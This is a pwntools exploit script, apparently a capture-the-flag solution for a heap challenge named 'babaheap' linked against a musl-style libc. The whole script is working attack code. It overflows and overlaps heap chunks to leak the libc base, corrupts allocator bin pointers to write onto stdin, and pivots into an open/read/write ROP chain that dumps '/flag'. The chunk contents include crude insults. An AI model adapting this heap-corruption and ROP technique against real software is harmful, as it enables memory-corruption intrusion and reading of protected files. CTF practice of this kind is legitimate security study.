from pwn import *
r = process(['./libc.so.2','./babaheap'])
libc = ELF("./libc.so.2")
def menu(choice):
    r.recvuntil('Command: ')
    r.sendline(str(choice))

def add(size,content):
    menu(1)
    r.recvuntil('Size: ')
    r.sendline(str(size))
    r.recvuntil('Content: ')
    r.send(content)

def edit(index,size,content):
    menu(2)
    r.recvuntil('Index: ')
    r.sendline(str(index))
    r.recvuntil('Size: ')
    r.sendline(str(size))
    r.recvuntil('Content: ')
    r.send(content)

def delete(index):
    menu(3)
    r.recvuntil('Index: ')
    r.sendline(str(index))

def show(index):
    menu(4)
    r.recvuntil('Index: ')
    r.sendline(str(index))


add(0x10,'a\n')#0
add(0x10,'a\n')#1
add(0x10,'a\n')#2
add(0x100,'a\n')#3
delete(3)
delete(2)
delete(1)
delete(0)
add(0x60,'nmsl\n')#0
add(0x10,'wsnd\n')#1
add(0x10,'a\n')#2
payload = p64(0)*2+p64(0x81)+p64(0x41)+p64(0)*2+p64(0x21)*2+p64(0)*2+p64(0x41)[:7]+'\n'
edit(3,0x100,payload)
delete(1)
add(0x10,'a\n')#1
show(2)
r.recvuntil("Chunk[2]: ")
libc_base = u64(r.recv(6).ljust(8,'\x00'))-0xb0dd0
success("libc_base = "+hex(libc_base))
add(0x10,'a\n')#3
add(0x10,'nmsl\n')#4
stdin = libc_base+0xb0180
delete(3)
edit(3,0x10,p64(stdin-0x10)*2+'\n')
add(0x10,'\n')#3
mybin = libc_base+0xb0dc8
rdi = 0x0000000000015291+libc_base
rsi = 0x000000000001d829+libc_base
rdx = 0x000000000002cdda+libc_base
open_ = libc_base+libc.sym['open']
read = libc_base+libc.sym['read']
write = libc_base+libc.sym['write']
rop = p64(rdi)+p64(0)+p64(rsi)+p64(libc_base+libc.bss())+p64(rdx)+p64(0x8)+p64(read)
rop += p64(rdi)+p64(libc_base+libc.bss())+p64(rsi)+p64(0)+p64(open_)
rop += p64(rdi)+p64(3)+p64(rsi)+p64(libc_base+libc.bss())+p64(rdx)+p64(0x100)+p64(read)
rop += p64(rdi)+p64(1)+p64(rsi)+p64(libc_base+libc.bss())+p64(rdx)+p64(0x100)+p64(write)
dininghall_gadget = libc_base+0x0000000000078d24
rop_addr = stdin
ret = 0x0000000000015292+libc_base
delete(3)
edit(3,0x10,p64(mybin-0x18)+p64(stdin-0x10)+'\n')
add(0x10,'\n')

payload = rop.ljust(0x100,'\x00')
payload += p64(0)*4+p64(1)*2
payload += p64(rop_addr)
payload += p64(ret)
payload += p64(0)
payload += p64(dininghall_gadget) 
menu(1)
r.recvuntil('Size: ')
r.sendline(str(0x200))
r.send(payload+'\n')
pause()
r.send('/flag\x00\n')

r.interactive()